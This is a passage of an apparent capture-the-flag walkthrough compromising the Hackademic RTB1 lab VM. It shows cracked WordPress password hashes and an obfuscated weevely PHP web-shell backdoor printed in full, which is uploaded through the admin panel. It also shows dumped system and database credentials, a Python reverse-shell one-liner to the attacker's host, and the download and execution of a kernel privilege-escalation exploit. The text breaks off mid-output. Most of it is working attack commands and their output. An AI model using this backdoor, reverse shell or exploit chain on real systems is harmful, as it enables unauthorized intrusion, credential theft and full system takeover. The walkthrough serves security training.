<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>

<p>We crack the hashes:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep &ldquo;^[0-9]+&rdquo; wp_users.csv| awk -F, &lsquo;{print $10 &ldquo;:&rdquo;  $9}&rsquo;  > /tmp/wp_users.john
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john &ndash;format=raw-md5
</span><span class='line'>Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
</span><span class='line'>NickJames:admin
</span><span class='line'>JohnSmith:PUPPIES
</span><span class='line'>GeorgeMiller:q1w2e3
</span><span class='line'>TonyBlack:napoleon
</span><span class='line'>JasonKonnors:maxwell
</span><span class='line'>MaxBucky:kernel
</span><span class='line'>guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
</span><span class='line'>Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure></p>

<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
</span><span class='line'><span class="o">[</span>generate.php<span class="o">]</span> Backdoor file <span class="p">&amp;</span>lsquo<span class="p">;</span>weevely.php<span class="p">&amp;</span>rsquo<span class="p">;</span> created with password <span class="p">&amp;</span>lsquo<span class="p">;</span>1234<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">kali32</span><span class="o">:~/.</span><span class="nx">sqlmap</span><span class="o">/</span><span class="nx">output</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">80.146</span><span class="o">/</span><span class="nx">dump</span><span class="o">/</span><span class="nx">wordpress</span><span class="c1"># cat weevely.php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$duiq</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">sc</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">scssctscrsc_scrsceplscasccsce</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="nv">$lucw</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$udtq</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$foif</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$kvzf</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$tkjs</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">v</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">bvavsve6v4v_vdvevcvovdve</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="nv">$nqkm</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">d</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">dcdrdedatded_fudncdtdidodn</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="nv">$itsd</span> <span class="o">=</span> <span class="nv">$nqkm</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$tkjs</span><span class="p">(</span><span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">woh</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$udtq</span><span class="o">.</span><span class="nv">$lucw</span><span class="o">.</span><span class="nv">$kvzf</span><span class="o">.</span><span class="nv">$foif</span><span class="p">)));</span> <span class="nv">$itsd</span><span class="p">();</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We connect using weevely and found out the mysql root password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely &lt;a href="http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php">http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php&lt;/a> 1234&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
</span><span class='line'>&lt;a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP&lt;/a> User:/var/&lt;a href="ftp:/sbin/nologin">ftp:/sbin/nologin&lt;/a>
</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
</span><span class='line'>vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
</span><span class='line'>avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
</span><span class='line'>rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
</span><span class='line'>nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
</span><span class='line'>tcpdump:x:72:72::/:/sbin/nologin
</span><span class='line'>avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
</span><span class='line'>haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
</span><span class='line'>openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
</span><span class='line'>apache:x:48:489:Apache:/var/www:/sbin/nologin
</span><span class='line'>saslauth:x:495:488:&ldquo;Saslauthd user&rdquo;:/var/empty/saslauth:/sbin/nologin
</span><span class='line'>mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
</span><span class='line'>sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
</span><span class='line'>pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
</span><span class='line'>gdm:x:42:481::/var/lib/gdm:/sbin/nologin
</span><span class='line'>p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
</span><span class='line'>mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">@</span><span class="nx">HackademicRTB1</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">Hackademic_RTB1</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">// &lt;strong&gt; MySQL settings &lt;/strong&gt; //</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_NAME</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wordpress</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// The name of the database</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_USER</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// Your MySQL username</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_PASSWORD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">lz5yedns</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span> <span class="c1">// &amp;hellip;and password</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_HOST</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// 99% chance you won&amp;rsquo;t need to change this value&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Change</span> <span class="nx">the</span> <span class="nx">prefix</span> <span class="k">if</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">have</span> <span class="nx">multiple</span> <span class="nx">blogs</span> <span class="nx">in</span> <span class="nx">a</span> <span class="nx">single</span> <span class="nx">database</span><span class="o">.</span>
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wp</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>   <span class="c1">// example: &amp;lsquo;wp&lt;/em&gt;&amp;rsquo; or &amp;lsquo;b2&amp;rsquo; or &amp;lsquo;mylogin_&amp;rsquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Change</span> <span class="k">this</span> <span class="nx">to</span> <span class="nx">localize</span> <span class="nx">WordPress</span><span class="o">.</span>  <span class="nx">A</span> <span class="nx">corresponding</span> <span class="nx">MO</span> <span class="nb">file</span> <span class="k">for</span> <span class="nx">the</span>
</span><span class='line'><span class="c1">// chosen language must be installed to wp-includes/languages.</span>
</span><span class='line'><span class="c1">// For example, install de.mo to wp-includes/languages and set WPLANG to &amp;lsquo;de&amp;rsquo;</span>
</span><span class='line'><span class="c1">// to enable German language support.</span>
</span><span class='line'><span class="nb">define</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">WPLANG</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Stop</span> <span class="nx">editing</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ABSPATH</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nb">dirname</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">FILE</span><span class="o">&lt;/</span><span class="nx">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">require_once</span><span class="p">(</span><span class="nx">ABSPATH</span><span class="o">.&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wp</span><span class="o">-</span><span class="nx">settings</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>@HackademicRTB1:/tmp <span class="nv">$ </span>sudo -l
</span><span class='line'>sudo: sorry, you must have a tty to run sudo
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="p">:</span><span class="o">~</span><span class="c"># nc -lp 1338&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nd">@HackademicRTB1</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span> <span class="n">_</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">;</span> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)));</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1338</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>For privilege escalation, we use the following exploit:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali32</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="err">#</span> <span class="n">head</span> <span class="n">platforms</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="mf">15285.</span><span class="n">c</span>
</span><span class='line'><span class="c1">//source: &lt;a href=&quot;http://www.vsecurity.com/resources/advisory/20101019-1/&quot;&gt;http://www.vsecurity.com/resources/advisory/20101019-1/&lt;/a&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Linux</span> <span class="n">Kernel</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="mf">2.6.36</span><span class="o">-</span><span class="n">rc8</span> <span class="n">RDS</span> <span class="n">privilege</span> <span class="n">escalation</span> <span class="n">exploit</span>
</span><span class='line'> <span class="o">*</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2010</span><span class="o">-</span><span class="mi">3904</span>
</span><span class='line'> <span class="o">*</span> <span class="n">by</span> <span class="n">Dan</span> <span class="n">Rosenberg</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#100;&amp;#x72;&amp;#111;&amp;#x73;&amp;#x65;&amp;#110;&amp;#98;&amp;#101;&amp;#114;&amp;#x67;&amp;#x40;&amp;#118;&amp;#115;&amp;#101;&amp;#x63;&amp;#117;&amp;#x72;&amp;#105;&amp;#x74;&amp;#121;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#x6d;&quot;</span><span class="o">&gt;&amp;</span><span class="err">#</span><span class="mi">100</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x72</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">111</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">115</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x65</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">110</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x62</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x65</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x72</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">103</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x40</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">118</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">115</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x65</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x63</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x75</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">114</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">105</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x74</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x79</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">46</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">99</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x6f</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">109</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Copyright</span> <span class="mi">2010</span> <span class="n">Virtual</span> <span class="n">Security</span> <span class="n">Research</span><span class="p">,</span> <span class="n">LLC</span>
</span><span class='line'> <span class="o">*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">The</span> <span class="n">handling</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">sending</span> <span class="n">and</span> <span class="n">receiving</span> <span class="n">RDS</span> <span class="n">messages</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.0<span class="nv">$ </span>wget <span class="p">&amp;</span>ndash<span class="p">;</span>no-check-certificate &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.exploit-db.com/download/15285&quot;</span>&gt;https://www.exploit-db.com/download/15285&lt;/a&gt; -O a.c
</span><span class='line'>bash-4.0<span class="nv">$ </span>gcc a.c
</span><span class='line'>gcc a.c
</span><span class='line'>bash-4.0<span class="nv">$ </span>./a.out
</span><span class='line'>./a.out
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Linux kernel &gt;<span class="o">=</span> 2.6.30 RDS socket exploit
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> by Dan Rosenberg
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Resolving kernel addresses<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved security_ops to 0xc0aa19ac
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved commit_creds to 0xc044e5f1
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Overwriting security ops<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Overwriting <span class="k">function</span> pointer<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Triggering payload<span class="p">&amp;</span>hellip<span class="p">;</span>
